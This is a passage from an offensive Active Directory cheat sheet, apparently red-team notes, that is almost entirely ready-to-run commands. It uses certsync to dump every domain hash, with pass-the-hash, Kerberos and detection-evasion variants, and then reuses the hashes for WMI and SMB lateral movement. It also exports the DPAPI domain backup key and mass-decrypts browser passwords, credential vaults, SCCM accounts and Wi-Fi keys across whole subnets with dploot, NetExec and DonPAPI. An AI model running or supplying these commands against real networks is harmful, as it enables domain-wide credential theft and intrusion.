certsync -u jdoe -p Password123 -d DOMAIN.LOCAL -dc-ip 192.168.1.1 -ns 192.168.1.1

# certsync — pass-the-hash
certsync -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 \
  -u Administrator -d DOMAIN.LOCAL -dc-ip 192.168.1.1 -ns 192.168.1.1

# certsync — Kerberos (ccache)
export KRB5CCNAME=admin.ccache
certsync -k -no-pass -u Administrator -d DOMAIN.LOCAL \
  -dc-ip 192.168.1.1 -ns 192.168.1.1

# certsync — supply existing CA cert + key (skip CA backup step; quieter)
certsync -ca-pfx ca.pfx -u jdoe -p Password123 \
  -d DOMAIN.LOCAL -dc-ip 192.168.1.1 -ns 192.168.1.1

# certsync — OPSEC: jitter, randomized per-user certs, custom LDAP filter
certsync -u jdoe -p Password123 -d DOMAIN.LOCAL -dc-ip 192.168.1.1 \
  -ns 192.168.1.1 -timeout 2 -jitter 1 -randomize \
  -ldap-filter "(&(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"

# certsync — output to file
certsync -u jdoe -p Password123 -d DOMAIN.LOCAL -dc-ip 192.168.1.1 \
  -ns 192.168.1.1 -outputfile domain_hashes

# Feed recovered hashes into Titanis PTH flows (use IP for Wmi exec; FQDNs fail at WMI DCOM activation)
Wmi exec 192.168.1.1 -UserName Administrator@DOMAIN \
  -NtlmHash <recovered_nt> "whoami"
Smb2Client ls \\dc01.domain.local\C$ -UserName Administrator@DOMAIN \
  -NtlmHash <recovered_nt>
```

[↑ Back to Index](#index)

---

### DPAPI Domain Backup Key — Mass Credential Decryption

> The DPAPI domain backup key is a domain-wide secret held on DCs that decrypts every user's DPAPI master key — and therefore every DPAPI-protected blob in the domain: Chrome/Edge/Firefox passwords, Windows Credential Manager, certificates, Wi-Fi keys, SCCM NAA accounts, scheduled task credentials, and more. Dumping it requires DA, but once obtained the key is permanently valid unless explicitly rotated. Produces breadth of credential coverage comparable to NTDS for secrets stored in DPAPI blobs, and is often richer for lateral movement because it yields plaintext passwords rather than hashes.

```bash
# Step 1 — dump the domain backup key (impacket)
dpapi.py backupkeys -t DOMAIN/Administrator:Password123@192.168.1.1 --export
# Writes domain_backup.pvk to current directory

# Step 1 — impacket pass-the-hash
dpapi.py backupkeys -t DOMAIN/Administrator@192.168.1.1 --export \
  -hashes :A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5

# Step 1 — dump the domain backup key (NetExec; fetches automatically during --dpapi)
netexec smb 192.168.1.1 -u Administrator -p Password123 --dpapi

# Step 2a — dploot: decrypt master keys for all domain users using backup key
dploot masterkeys -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.1 --pvk domain_backup.pvk -outputfile masterkeys.txt

# Step 2b — dploot: decrypt all credential manager blobs across domain
dploot credentials -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.1 --pvk domain_backup.pvk

# Step 2c — dploot: decrypt browser-stored passwords (Chrome, Edge, Firefox)
dploot browser -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.1 --pvk domain_backup.pvk

# Step 2d — dploot: full triage (masterkeys + credentials + certificates + vaults)
dploot triage -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.1 --pvk domain_backup.pvk

# Step 2e — dploot: SCCM NAA credentials and collection variables
dploot sccm -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.1 --pvk domain_backup.pvk

# Step 2f — dploot: machine (SYSTEM scope) DPAPI secrets
dploot machinetriage -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.1

# dploot — pass-the-hash
dploot triage -d DOMAIN -u Administrator \
  -H A2F8C3D1B4E5F6A7B8C9D0E1F2A3B4C5 -t 192.168.1.1 --pvk domain_backup.pvk

# NetExec — DPAPI dump across subnet (fetches backup key automatically)
netexec smb 192.168.1.0/24 -u Administrator -p Password123 --dpapi
netexec smb 192.168.1.0/24 -u Administrator -p Password123 --dpapi cookies
netexec smb 192.168.1.0/24 -u Administrator -p Password123 --dpapi nosystem

# DonPAPI — comprehensive remote DPAPI harvest across subnet in one pass
# (auto-fetches backup key, decrypts masterkeys, dumps all DPAPI-protected secrets)
DonPAPI collect -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.0/24 --fetch-pvk

# DonPAPI — supply existing backup key (quieter; avoids re-dumping from DC)
DonPAPI collect -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.0/24 --pvkfile domain_backup.pvk

# DonPAPI — targeted collectors only
DonPAPI collect -d DOMAIN -u Administrator -p Password123 \
  -t 192.168.1.0/24 --collectors SCCM,Certificates,Wifi,CredMan
```

[↑ Back to Index](#index)

---
